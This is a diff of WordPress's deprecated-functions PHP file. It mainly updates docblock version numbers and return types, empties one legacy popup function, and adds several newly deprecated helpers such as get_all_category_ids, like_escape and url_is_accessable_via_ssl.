@@ -596,7 +592,7 @@ function get_links_withrating($category = -1, $before = '', $after = '<br />', $
  * Gets the auto_toggle setting.
  *
  * @since 0.71
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated No alternative function available
  *
  * @param int $id The category to get. If no category supplied uses 0
@@ -609,7 +605,7 @@ function get_autotoggle($id = 0) {
 
 /**
  * @since 0.71
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use wp_list_categories()
  * @see wp_list_categories()
  *
@@ -631,7 +627,7 @@ function get_autotoggle($id = 0) {
  * @param string $feed_image
  * @param string $exclude
  * @param bool $hierarchical
- * @return unknown
+ * @return false|null
  */
 function list_cats($optionall = 1, $all = 'All', $sort_column = 'ID', $sort_order = 'asc', $file = '', $list = true, $optiondates = 0,
 				   $optioncount = 0, $hide_empty = 1, $use_desc_for_title = 1, $children=false, $child_of=0, $categories=0,
@@ -644,13 +640,13 @@ function list_cats($optionall = 1, $all = 'All', $sort_column = 'ID', $sort_orde
 }
 
 /**
- * @since 1.2
- * @deprecated 2.1
+ * @since 1.2.0
+ * @deprecated 2.1.0
  * @deprecated Use wp_list_categories()
  * @see wp_list_categories()
  *
  * @param string|array $args
- * @return unknown
+ * @return false|null|string
  */
 function wp_list_cats($args = '') {
 	_deprecated_function( __FUNCTION__, '2.1', 'wp_list_categories()' );
@@ -677,7 +673,7 @@ function wp_list_cats($args = '') {
 
 /**
  * @since 0.71
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use wp_dropdown_categories()
  * @see wp_dropdown_categories()
  *
@@ -691,7 +687,7 @@ function wp_list_cats($args = '') {
  * @param bool $optionnone
  * @param int $selected
  * @param int $exclude
- * @return unknown
+ * @return string
  */
 function dropdown_cats($optionall = 1, $all = 'All', $orderby = 'ID', $order = 'asc',
 		$show_last_update = 0, $show_count = 0, $hide_empty = 1, $optionnone = false,
@@ -713,8 +709,10 @@ function dropdown_cats($optionall = 1, $all = 'All', $orderby = 'ID', $order = '
 }
 
 /**
- * @since 1.2
- * @deprecated 2.1
+ * List authors.
+ *
+ * @since 1.2.0
+ * @deprecated 2.1.0
  * @deprecated Use wp_list_authors()
  * @see wp_list_authors()
  *
@@ -724,7 +722,7 @@ function dropdown_cats($optionall = 1, $all = 'All', $orderby = 'ID', $order = '
  * @param bool $hide_empty
  * @param string $feed
  * @param string $feed_image
- * @return unknown
+ * @return null|string
  */
 function list_authors($optioncount = false, $exclude_admin = true, $show_fullname = false, $hide_empty = true, $feed = '', $feed_image = '') {
 	_deprecated_function( __FUNCTION__, '2.1', 'wp_list_authors()' );
@@ -735,13 +733,13 @@ function list_authors($optioncount = false, $exclude_admin = true, $show_fullnam
 
 /**
  * @since 1.0.1
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use wp_get_post_categories()
  * @see wp_get_post_categories()
  *
  * @param int $blogid Not Used
  * @param int $post_ID
- * @return unknown
+ * @return array
  */
 function wp_get_post_cats($blogid = '1', $post_ID = 0) {
 	_deprecated_function( __FUNCTION__, '2.1', 'wp_get_post_categories()' );
@@ -752,14 +750,14 @@ function wp_get_post_cats($blogid = '1', $post_ID = 0) {
  * Sets the categories that the post id belongs to.
  *
  * @since 1.0.1
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use wp_set_post_categories()
  * @see wp_set_post_categories()
  *
  * @param int $blogid Not used
  * @param int $post_ID
  * @param array $post_categories
- * @return unknown
+ * @return bool|mixed
  */
 function wp_set_post_cats($blogid = '1', $post_ID = 0, $post_categories = array()) {
 	_deprecated_function( __FUNCTION__, '2.1', 'wp_set_post_categories()' );
@@ -768,7 +766,7 @@ function wp_set_post_cats($blogid = '1', $post_ID = 0, $post_categories = array(
 
 /**
  * @since 0.71
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use wp_get_archives()
  * @see wp_get_archives()
  *
@@ -778,7 +776,7 @@ function wp_set_post_cats($blogid = '1', $post_ID = 0, $post_categories = array(
  * @param string $before
  * @param string $after
  * @param bool $show_post_count
- * @return unknown
+ * @return string|null
  */
 function get_archives($type='', $limit='', $format='html', $before = '', $after = '', $show_post_count = false) {
 	_deprecated_function( __FUNCTION__, '2.1', 'wp_get_archives()' );
@@ -789,17 +787,17 @@ function get_archives($type='', $limit='', $format='html', $before = '', $after 
 /**
  * Returns or Prints link to the author's posts.
  *
- * @since 1.2
- * @deprecated 2.1
+ * @since 1.2.0
+ * @deprecated 2.1.0
  * @deprecated Use get_author_posts_url()
  * @see get_author_posts_url()
  *
- * @param bool $echo Optional.
- * @param int $author_id Required.
+ * @param bool $echo
+ * @param int $author_id
  * @param string $author_nicename Optional.
  * @return string|null
  */
-function get_author_link($echo = false, $author_id, $author_nicename = '') {
+function get_author_link($echo, $author_id, $author_nicename = '') {
 	_deprecated_function( __FUNCTION__, '2.1', 'get_author_posts_url()' );
 
 	$link = get_author_posts_url($author_id, $author_nicename);
@@ -813,7 +811,7 @@ function get_author_link($echo = false, $author_id, $author_nicename = '') {
  * Print list of pages based on arguments.
  *
  * @since 0.71
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use wp_link_pages()
  * @see wp_link_pages()
  *
@@ -838,7 +836,7 @@ function link_pages($before='<br />', $after='<br />', $next_or_number='number',
  * Get value based on option.
  *
  * @since 0.71
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use get_option()
  * @see get_option()
  *
@@ -855,7 +853,7 @@ function get_settings($option) {
  * Print the permalink of the current post in the loop.
  *
  * @since 0.71
- * @deprecated 1.2
+ * @deprecated 1.2.0
  * @deprecated Use the_permalink()
  * @see the_permalink()
  */
@@ -868,7 +866,7 @@ function permalink_link() {
  * Print the permalink to the RSS feed.
  *
  * @since 0.71
- * @deprecated 2.3
+ * @deprecated 2.3.0
  * @deprecated Use the_permalink_rss()
  * @see the_permalink_rss()
  *
@@ -884,7 +882,7 @@ function permalink_single_rss($deprecated = '') {
  *
  * @see get_links() for argument information that can be used in $args
  * @since 1.0.1
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use wp_list_bookmarks()
  * @see wp_list_bookmarks()
  *
@@ -924,7 +922,7 @@ function wp_get_links($args = '') {
  * Gets the links associated with category by id.
  *
  * @since 0.71
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use get_bookmarks()
  * @see get_bookmarks()
  *
@@ -1033,7 +1031,7 @@ function get_links($category = -1, $before = '', $after = '<br />', $between = '
  * $wpdb->linkcategories and output it as a nested HTML unordered list.
  *
  * @since 1.0.1
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use wp_list_bookmarks()
  * @see wp_list_bookmarks()
  *
@@ -1076,7 +1074,7 @@ function get_links_list($order = 'name') {
  * Show the link to the links popup and the number of links.
  *
  * @since 0.71
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated {@internal Use function instead is unknown}}
  *
  * @param string $text the text of the link
@@ -1087,28 +1085,16 @@ function get_links_list($order = 'name') {
  */
 function links_popup_script($text = 'Links', $width=400, $height=400, $file='links.all.php', $count = true) {
 	_deprecated_function( __FUNCTION__, '2.1' );
-
-	if ( $count )
-		$counts = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->links");
-
-	$javascript = "<a href=\"#\" onclick=\"javascript:window.open('$file?popup=1', '_blank', 'width=$width,height=$height,scrollbars=yes,status=no'); return false\">";
-	$javascript .= $text;
-
-	if ( $count )
-		$javascript .= " ($counts)";
-
-	$javascript .= "</a>\n\n";
-		echo $javascript;
 }
 
 /**
  * @since 1.0.1
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use sanitize_bookmark_field()
  * @see sanitize_bookmark_field()
  *
  * @param object $link
- * @return unknown
+ * @return mixed
  */
 function get_linkrating($link) {
 	_deprecated_function( __FUNCTION__, '2.1', 'sanitize_bookmark_field()' );
@@ -1119,7 +1105,7 @@ function get_linkrating($link) {
  * Gets the name of category by id.
  *
  * @since 0.71
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use get_category()
  * @see get_category()
  *
@@ -1149,7 +1135,7 @@ function get_linkcatname($id = 0) {
  * Print RSS comment feed link.
  *
  * @since 1.0.1
- * @deprecated 2.5
+ * @deprecated 2.5.0
  * @deprecated Use post_comments_feed_link()
  * @see post_comments_feed_link()
  *
@@ -1163,14 +1149,14 @@ function comments_rss_link($link_text = 'Comments RSS') {
 /**
  * Print/Return link to category RSS2 feed.
  *
- * @since 1.2
- * @deprecated 2.5
+ * @since 1.2.0
+ * @deprecated 2.5.0
  * @deprecated Use get_category_feed_link()
  * @see get_category_feed_link()
  *
  * @param bool $echo
  * @param int $cat_ID
- * @return string|null
+ * @return string
  */
 function get_category_rss_link($echo = false, $cat_ID = 1) {
 	_deprecated_function( __FUNCTION__, '2.5', 'get_category_feed_link()' );
@@ -1185,14 +1171,14 @@ function get_category_rss_link($echo = false, $cat_ID = 1) {
 /**
  * Print/Return link to author RSS feed.
  *
- * @since 1.2
- * @deprecated 2.5
+ * @since 1.2.0
+ * @deprecated 2.5.0
  * @deprecated Use get_author_feed_link()
  * @see get_author_feed_link()
  *
  * @param bool $echo
  * @param int $author_id
- * @return string|null
+ * @return string
  */
 function get_author_rss_link($echo = false, $author_id = 1) {
 	_deprecated_function( __FUNCTION__, '2.5', 'get_author_feed_link()' );
@@ -1206,8 +1192,8 @@ function get_author_rss_link($echo = false, $author_id = 1) {
 /**
  * Return link to the post RSS feed.
  *
- * @since 1.5
- * @deprecated 2.2
+ * @since 1.5.0
+ * @deprecated 2.2.0
  * @deprecated Use get_post_comments_feed_link()
  * @see get_post_comments_feed_link()
  *
@@ -1221,14 +1207,14 @@ function comments_rss() {
 /**
  * An alias of wp_create_user().
  *
- * @since 2.0
- * @deprecated 2.0
+ * @since 2.0.0
+ * @deprecated 2.0.0
  * @deprecated Use wp_create_user()
  * @see wp_create_user()
  *
  * @param string $username The user's username.
  * @param string $password The user's password.
- * @param string $email The user's email (optional).
+ * @param string $email    The user's email.
  * @return int The new user's ID.
  */
 function create_user($username, $password, $email) {
@@ -1239,7 +1225,7 @@ function create_user($username, $password, $email) {
 /**
  * Unused function.
  *
- * @deprecated 2.5
+ * @deprecated 2.5.0
 */
 function gzip_compression() {
 	_deprecated_function( __FUNCTION__, '2.5' );
@@ -1250,7 +1236,7 @@ function gzip_compression() {
  * Retrieve an array of comment data about comment $comment_ID.
  *
  * @since 0.71
- * @deprecated 2.7
+ * @deprecated 2.7.0
  * @deprecated Use get_comment()
  * @see get_comment()
  *
@@ -1268,7 +1254,7 @@ function get_commentdata( $comment_ID, $no_cache = 0, $include_unapproved = fals
  * Retrieve the category name by the category ID.
  *
  * @since 0.71
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use get_cat_name()
  * @see get_cat_name()
  *
@@ -1284,7 +1270,7 @@ function get_catname( $cat_ID ) {
  * Retrieve category children list separated before and after the term IDs.
  *
  * @since 1.2.0
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use get_term_children()
  * @see get_term_children()
  *
@@ -1319,10 +1305,31 @@ function get_category_children( $id, $before = '/', $after = '', $visited = arra
 }
 
 /**
+ * Retrieves all category IDs.
+ *
+ * @since 2.0.0
+ * @deprecated 4.0.0 Use get_terms() instead.
+ * @see get_terms()
+ * @link http://codex.wordpress.org/Function_Reference/get_all_category_ids
+ *
+ * @return object List of all of the category IDs.
+ */
+function get_all_category_ids() {
+	_deprecated_function( __FUNCTION__, '4.0', 'get_terms()' );
+
+	if ( ! $cat_ids = wp_cache_get( 'all_category_ids', 'category' ) ) {
+		$cat_ids = get_terms( 'category', array('fields' => 'ids', 'get' => 'all') );
+		wp_cache_add( 'all_category_ids', $cat_ids, 'category' );
+	}
+
+	return $cat_ids;
+}
+
+/**
  * Retrieve the description of the author of the current post.
  *
- * @since 1.5
- * @deprecated 2.8
+ * @since 1.5.0
+ * @deprecated 2.8.0
  * @deprecated Use get_the_author_meta('description')
  * @see get_the_author_meta()
  *
@@ -1337,7 +1344,7 @@ function get_the_author_description() {
  * Display the description of the author of the current post.
  *
  * @since 1.0.0
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use the_author_meta('description')
  * @see the_author_meta()
  */
@@ -1349,8 +1356,8 @@ function the_author_description() {
 /**
  * Retrieve the login name of the author of the current post.
  *
- * @since 1.5
- * @deprecated 2.8
+ * @since 1.5.0
+ * @deprecated 2.8.0
  * @deprecated Use get_the_author_meta('login')
  * @see get_the_author_meta()
  *
@@ -1365,7 +1372,7 @@ function get_the_author_login() {
  * Display the login name of the author of the current post.
  *
  * @since 0.71
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use the_author_meta('login')
  * @see the_author_meta()
  */
@@ -1377,8 +1384,8 @@ function the_author_login() {
 /**
  * Retrieve the first name of the author of the current post.
  *
- * @since 1.5
- * @deprecated 2.8
+ * @since 1.5.0
+ * @deprecated 2.8.0
  * @deprecated Use get_the_author_meta('first_name')
  * @see get_the_author_meta()
  *
@@ -1393,7 +1400,7 @@ function get_the_author_firstname() {
  * Display the first name of the author of the current post.
  *
  * @since 0.71
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use the_author_meta('first_name')
  * @see the_author_meta()
  */
@@ -1405,8 +1412,8 @@ function the_author_firstname() {
 /**
  * Retrieve the last name of the author of the current post.
  *
- * @since 1.5
- * @deprecated 2.8
+ * @since 1.5.0
+ * @deprecated 2.8.0
  * @deprecated Use get_the_author_meta('last_name')
  * @see get_the_author_meta()
  *
@@ -1421,7 +1428,7 @@ function get_the_author_lastname() {
  * Display the last name of the author of the current post.
  *
  * @since 0.71
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use the_author_meta('last_name')
  * @see the_author_meta()
  */
@@ -1433,8 +1440,8 @@ function the_author_lastname() {
 /**
  * Retrieve the nickname of the author of the current post.
  *
- * @since 1.5
- * @deprecated 2.8
+ * @since 1.5.0
+ * @deprecated 2.8.0
  * @deprecated Use get_the_author_meta('nickname')
  * @see get_the_author_meta()
  *
@@ -1449,7 +1456,7 @@ function get_the_author_nickname() {
  * Display the nickname of the author of the current post.
  *
  * @since 0.71
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use the_author_meta('nickname')
  * @see the_author_meta()
  */
@@ -1461,8 +1468,8 @@ function the_author_nickname() {
 /**
  * Retrieve the email of the author of the current post.
  *
- * @since 1.5
- * @deprecated 2.8
+ * @since 1.5.0
+ * @deprecated 2.8.0
  * @deprecated Use get_the_author_meta('email')
  * @see get_the_author_meta()
  *
@@ -1477,7 +1484,7 @@ function get_the_author_email() {
  * Display the email of the author of the current post.
  *
  * @since 0.71
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use the_author_meta('email')
  * @see the_author_meta()
  */
@@ -1489,8 +1496,8 @@ function the_author_email() {
 /**
  * Retrieve the ICQ number of the author of the current post.
  *
- * @since 1.5
- * @deprecated 2.8
+ * @since 1.5.0
+ * @deprecated 2.8.0
  * @deprecated Use get_the_author_meta('icq')
  * @see get_the_author_meta()
  *
@@ -1505,7 +1512,7 @@ function get_the_author_icq() {
  * Display the ICQ number of the author of the current post.
  *
  * @since 0.71
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use the_author_meta('icq')
  * @see the_author_meta()
  */
@@ -1517,8 +1524,8 @@ function the_author_icq() {
 /**
  * Retrieve the Yahoo! IM name of the author of the current post.
  *
- * @since 1.5
- * @deprecated 2.8
+ * @since 1.5.0
+ * @deprecated 2.8.0
  * @deprecated Use get_the_author_meta('yim')
  * @see get_the_author_meta()
  *
@@ -1533,7 +1540,7 @@ function get_the_author_yim() {
  * Display the Yahoo! IM name of the author of the current post.
  *
  * @since 0.71
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use the_author_meta('yim')
  * @see the_author_meta()
  */
@@ -1545,8 +1552,8 @@ function the_author_yim() {
 /**
  * Retrieve the MSN address of the author of the current post.
  *
- * @since 1.5
- * @deprecated 2.8
+ * @since 1.5.0
+ * @deprecated 2.8.0
  * @deprecated Use get_the_author_meta('msn')
  * @see get_the_author_meta()
  *
@@ -1561,7 +1568,7 @@ function get_the_author_msn() {
  * Display the MSN address of the author of the current post.
  *
  * @since 0.71
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use the_author_meta('msn')
  * @see the_author_meta()
  */
@@ -1573,8 +1580,8 @@ function the_author_msn() {
 /**
  * Retrieve the AIM address of the author of the current post.
  *
- * @since 1.5
- * @deprecated 2.8
+ * @since 1.5.0
+ * @deprecated 2.8.0
  * @deprecated Use get_the_author_meta('aim')
  * @see get_the_author_meta()
  *
@@ -1590,7 +1597,7 @@ function get_the_author_aim() {
  *
  * @since 0.71
  * @see the_author_meta()
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use the_author_meta('aim')
  */
 function the_author_aim() {
@@ -1602,7 +1609,7 @@ function the_author_aim() {
  * Retrieve the specified author's preferred display name.
  *
  * @since 1.0.0
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use get_the_author_meta('display_name')
  * @see get_the_author_meta()
  *
@@ -1617,8 +1624,8 @@ function get_author_name( $auth_id = false ) {
 /**
  * Retrieve the URL to the home page of the author of the current post.
  *
- * @since 1.5
- * @deprecated 2.8
+ * @since 1.5.0
+ * @deprecated 2.8.0
  * @deprecated Use get_the_author_meta('url')
  * @see get_the_author_meta()
  *
@@ -1633,7 +1640,7 @@ function get_the_author_url() {
  * Display the URL to the home page of the author of the current post.
  *
  * @since 0.71
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use the_author_meta('url')
  * @see the_author_meta()
  */
@@ -1645,12 +1652,12 @@ function the_author_url() {
 /**
  * Retrieve the ID of the author of the current post.
  *
- * @since 1.5
- * @deprecated 2.8
+ * @since 1.5.0
+ * @deprecated 2.8.0
  * @deprecated Use get_the_author_meta('ID')
  * @see get_the_author_meta()
  *
- * @return int The author's ID.
+ * @return string|int The author's ID.
  */
 function get_the_author_ID() {
 	_deprecated_function( __FUNCTION__, '2.8', 'get_the_author_meta(\'ID\')' );
@@ -1661,7 +1668,7 @@ function get_the_author_ID() {
  * Display the ID of the author of the current post.
  *
  * @since 0.71
- * @deprecated 2.8
+ * @deprecated 2.8.0
  * @deprecated Use the_author_meta('ID')
  * @see the_author_meta()
 */
@@ -1687,26 +1694,21 @@ function the_author_ID() {
  * dots added to the end. If there is content left over, then dots will be added
  * and the rest of the content will be removed.
  *
- * @package WordPress
- * @subpackage Feed
  * @since 0.71
- * @uses apply_filters() Calls 'the_content_rss' on the content before processing.
- * @see get_the_content() For the $more_link_text, $stripteaser, and $more_file
- *		parameters.
  *
  * @deprecated 2.9.0
  * @deprecated Use the_content_feed()
  * @see the_content_feed()
  *
  * @param string $more_link_text Optional. Text to display when more content is available but not displayed.
- * @param int|bool $stripteaser Optional. Default is 0.
+ * @param int $stripteaser Optional. Default is 0.
  * @param string $more_file Optional.
  * @param int $cut Optional. Amount of words to keep for the content.
  * @param int $encode_html Optional. How to encode the content.
  */
 function the_content_rss($more_link_text='(more...)', $stripteaser=0, $more_file='', $cut = 0, $encode_html = 0) {
 	_deprecated_function( __FUNCTION__, '2.9', 'the_content_feed' );
-	$content = get_the_content($more_link_text, $stripteaser, $more_file);
+	$content = get_the_content($more_link_text, $stripteaser);
 	$content = apply_filters('the_content_rss', $content);
 	if ( $cut && !$encode_html )
 		$encode_html = 2;
@@ -1799,8 +1801,7 @@ function _c( $text, $domain = 'default' ) {
  * Translates $text like translate(), but assumes that the text
  * contains a context after its last vertical bar.
  *
- * @since 2.5
- * @uses translate()
+ * @since 2.5.0
  * @deprecated 3.0.0
  * @deprecated Use _x()
  * @see _x()
@@ -1848,7 +1849,7 @@ function __ngettext() {
 /**
  * Register plural strings in POT file, but don't translate them.
  *
- * @since 2.5
+ * @since 2.5.0
  * @deprecated 2.8.0
  * @deprecated Use _n_noop()
  * @see _n_noop()
@@ -1930,13 +1931,11 @@ function get_attachment_icon_src( $id = 0, $fullsize = false ) {
 		// We have a thumbnail desired, specified and existing
 
 		$src_file = basename($src);
-		$class = 'attachmentthumb';
 	} elseif ( wp_attachment_is_image( $post->ID ) ) {
 		// We have an image without a thumbnail
 
 		$src = wp_get_attachment_url( $post->ID );
 		$src_file = & $file;
-		$class = 'attachmentimage';
 	} elseif ( $src = wp_mime_type_icon( $post->ID ) ) {
 		// No thumb, no image. We'll look for a mime-related icon instead.
 
@@ -1961,7 +1960,7 @@ function get_attachment_icon_src( $id = 0, $fullsize = false ) {
  * @param int $id Optional. Post ID.
  * @param bool $fullsize Optional, default to false. Whether to have full size image.
  * @param array $max_dims Optional. Dimensions of image.
- * @return string HTML content.
+ * @return false|string HTML content.
  */
 function get_attachment_icon( $id = 0, $fullsize = false, $max_dims = false ) {
 	_deprecated_function( __FUNCTION__, '2.5', 'wp_get_attachment_image()' );
@@ -2018,7 +2017,7 @@ function get_attachment_icon( $id = 0, $fullsize = false, $max_dims = false ) {
  * @param int $id Optional. Post ID.
  * @param bool $fullsize Optional, default to false. Whether to have full size image.
  * @param array $max_dims Optional. Dimensions of image.
- * @return string
+ * @return false|string
  */
 function get_attachment_innerHTML($id = 0, $fullsize = false, $max_dims = false) {
 	_deprecated_function( __FUNCTION__, '2.5', 'wp_get_attachment_image()' );
@@ -2421,7 +2420,8 @@ function update_usermeta( $user_id, $meta_key, $meta_value ) {
  *
  * @since 2.2.0
  * @deprecated 3.1.0
- * @uses $wpdb WordPress database object for queries
+ *
+ * @global wpdb $wpdb WordPress database abstraction object.
  * @uses $blog_id The Blog id of the blog for those that use more than one blog
  *
  * @param int $id Blog ID.
@@ -2501,7 +2501,7 @@ function funky_javascript_callback($matches) {
 }
 
 /**
- * Fixes javascript bugs in browsers.
+ * Fixes JavaScript bugs in browsers.
  *
  * Converts unicode characters to HTML numbered entities.
  *
@@ -2515,7 +2515,7 @@ function funky_javascript_callback($matches) {
  */
 function funky_javascript_fix($text) {
 	_deprecated_function( __FUNCTION__, '3.0' );
-	// Fixes for browsers' javascript bugs
+	// Fixes for browsers' JavaScript bugs.
 	global $is_macIE, $is_winIE;
 
 	if ( $is_winIE || $is_macIE )
@@ -2985,7 +2985,7 @@ function get_current_theme() {
 /**
  * Accepts matches array from preg_replace_callback in wpautop() or a string.
  *
- * Ensures that the contents of a <<pre>>...<</pre>> HTML block are not
+ * Ensures that the contents of a `<pre>...</pre>` HTML block are not
  * converted into paragraphs or line-breaks.
  *
  * @since 1.2.0
@@ -3041,7 +3041,7 @@ function add_custom_image_header( $wp_head_callback, $admin_head_callback, $admi
  * @deprecated Use remove_theme_support('custom-header')
  * @see remove_theme_support()
  *
- * @return bool Whether support was removed.
+ * @return null|bool Whether support was removed.
  */
 function remove_custom_image_header() {
 	_deprecated_function( __FUNCTION__, '3.4', 'remove_theme_support( \'custom-header\' )' );
@@ -3078,7 +3078,7 @@ function add_custom_background( $wp_head_callback = '', $admin_head_callback = '
  * @since 3.1.0
  * @see add_custom_background()
  *
- * @return bool Whether support was removed.
+ * @return null|bool Whether support was removed.
  */
 function remove_custom_background() {
 	_deprecated_function( __FUNCTION__, '3.4', 'remove_theme_support( \'custom-background\' )' );
@@ -3146,8 +3146,6 @@ function update_page_cache( &$pages ) {
  *
  * @since 2.0.0
  * @deprecated 3.4.0
- *
- * @uses do_action() Will call the 'clean_page_cache' hook action.
  *
  * @param int $id Page ID to clean
  */
@@ -3294,11 +3292,11 @@ function image_resize( $file, $max_w, $max_h, $crop = false, $suffix = null, $de
  *
  * @param int $postid Post ID.
  * @param string $mode How to return result, either OBJECT, ARRAY_N, or ARRAY_A.
- * @return object|array Post object or array holding post contents and information
+ * @return WP_Post|null Post object or array holding post contents and information
  */
 function wp_get_single_post( $postid = 0, $mode = OBJECT ) {
 	_deprecated_function( __FUNCTION__, '3.5', 'get_post()' );
-	return get_post( $postid, $mode, 'edit' );
+	return get_post( $postid, $mode );
 }
 
 /**
@@ -3335,7 +3333,7 @@ function _save_post_hook() {}
  *
  * @since 2.9.0
  * @deprecated 3.5.0
- * see wp_image_editor_supports()
+ * @see wp_image_editor_supports()
  *
  * @param string $mime_type
  * @return bool
@@ -3362,5 +3360,135 @@ function gd_edit_image_support($mime_type) {
 				return function_exists('imagecreatefromgif');
 		}
 	}
+	return false;
+}
+
+/**
+ * Converts an integer byte value to a shorthand byte value.
+ *
+ * @since 2.3.0
+ * @deprecated 3.6.0
+ * @deprecated Use size_format()
+ *
+ * @param int $bytes An integer byte value.
+ * @return string A shorthand byte value.
+ */
+function wp_convert_bytes_to_hr( $bytes ) {
+	_deprecated_function( __FUNCTION__, '3.6', 'size_format()' );
+
+	$units = array( 0 => 'B', 1 => 'kB', 2 => 'MB', 3 => 'GB', 4 => 'TB' );
+	$log   = log( $bytes, 1024 );
+	$power = (int) $log;
+	$size  = pow( 1024, $log - $power );
+
+	if ( ! is_nan( $size ) && array_key_exists( $power, $units ) ) {
+		$unit = $units[ $power ];
+	} else {
+		$size = $bytes;
+		$unit = $units[0];
+	}
+
+	return $size . $unit;
+}
+
+/**
+ * Formerly used internally to tidy up the search terms.
+ *
+ * @access private
+ * @since 2.9.0
+ * @deprecated 3.7.0
+ */
+function _search_terms_tidy( $t ) {
+	_deprecated_function( __FUNCTION__, '3.7' );
+	return trim( $t, "\"'\n\r " );
+}
+
+/**
+ * Determine if TinyMCE is available.
+ *
+ * Checks to see if the user has deleted the tinymce files to slim down
+ * their WordPress install.
+ *
+ * @since 2.1.0
+ * @deprecated 3.9.0
+ *
+ * @return bool Whether TinyMCE exists.
+ */
+function rich_edit_exists() {
+	global $wp_rich_edit_exists;
+	_deprecated_function( __FUNCTION__, '3.9' );
+
+	if ( ! isset( $wp_rich_edit_exists ) )
+		$wp_rich_edit_exists = file_exists( ABSPATH . WPINC . '/js/tinymce/tinymce.js' );
+
+	return $wp_rich_edit_exists;
+}
+
+/**
+ * Old callback for tag link tooltips.
+ *
+ * @since 2.7.0
+ * @deprecated 3.9.0
+ * @access private
+ */
+function default_topic_count_text( $count ) {
+	return $count;
+}
+
+/**
+ * Formerly used to escape strings before inserting into the DB.
+ *
+ * Has not performed this function for many, many years. Use wpdb::prepare() instead.
+ *
+ * @since 0.71
+ * @deprecated 3.9.0
+ *
+ * @param string $content The text to format.
+ * @return string The very same text.
+ */
+function format_to_post( $content ) {
+	_deprecated_function( __FUNCTION__, '3.9' );
+	return $content;
+}
+
+/**
+ * Formerly used to escape strings before searching the DB. It was poorly documented and never worked as described.
+ *
+ * @since 2.5.0
+ * @deprecated 4.0.0
+ * @deprecated Use wpdb::esc_like()
+ *
+ * @param string $text The text to be escaped.
+ * @return string text, safe for inclusion in LIKE query.
+ */
+function like_escape($text) {
+	_deprecated_function( __FUNCTION__, '4.0', 'wpdb::esc_like()' );
+	return str_replace( array( "%", "_" ), array( "\\%", "\\_" ), $text );
+}
+
+/**
+ * Determines if the URL can be accessed over SSL.
+ *
+ * Determines if the URL can be accessed over SSL by using the WordPress HTTP API to access
+ * the URL using https as the scheme.
+ *
+ * @since 2.5.0
+ * @deprecated 4.0.0
+ *
+ * @param string $url The URL to test.
+ * @return bool Whether SSL access is available.
+ */
+function url_is_accessable_via_ssl( $url ) {
+	_deprecated_function( __FUNCTION__, '4.0' );
+
+	$response = wp_remote_get( set_url_scheme( $url, 'https' ) );
+
+	if ( !is_wp_error( $response ) ) {
+		$status = wp_remote_retrieve_response_code( $response );
+		if ( 200 == $status || 401 == $status ) {
+			return true;
+		}
+	}
+
 	return false;
 }
